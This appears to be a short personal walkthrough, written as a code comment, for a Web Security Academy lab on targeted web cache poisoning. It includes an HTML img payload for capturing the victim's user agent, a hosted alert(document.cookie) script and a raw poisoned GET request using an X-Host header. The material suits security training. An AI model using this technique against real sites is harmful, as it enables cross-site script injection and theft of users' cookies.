/*

1) Looking at the GET / request,
Vary: User-Agent
// so user-agent is a basis for the request getting cached
// identify the user-agent of the victim by making the victim make a request to  the exploit server


2) Param miner says X-host is allowed

3) go to a comment section it says HTML is allowed as an input . 
    post a redirecting html snippet

<img src="https://exploit-0a1d0050047c2b0b80723972019a00fa.exploit-server.net/exploit">
// send and go back to blog
// check access logs of exploit server for user agent different than ours

Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
// set the user-agent in the GET / request to this


4) change filename on exploit server to /resources/js/tracking.js
// this is an unvalidated resource import and can be used to execute our code
// and the website will look at our exploit server to import it 

// change the body to alert(document.cookie)
//store the exploit



5) 
// modify the GET / request and send until cache-hit

GET / HTTP/1.1
Host: 0ade002004412b3a80283a6200e500ae.h1-web-security-academy.net
User-Agent:  Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
X-Host: exploit-0a1d0050047c2b0b80723972019a00fa.exploit-server.net

6) send and voila





*/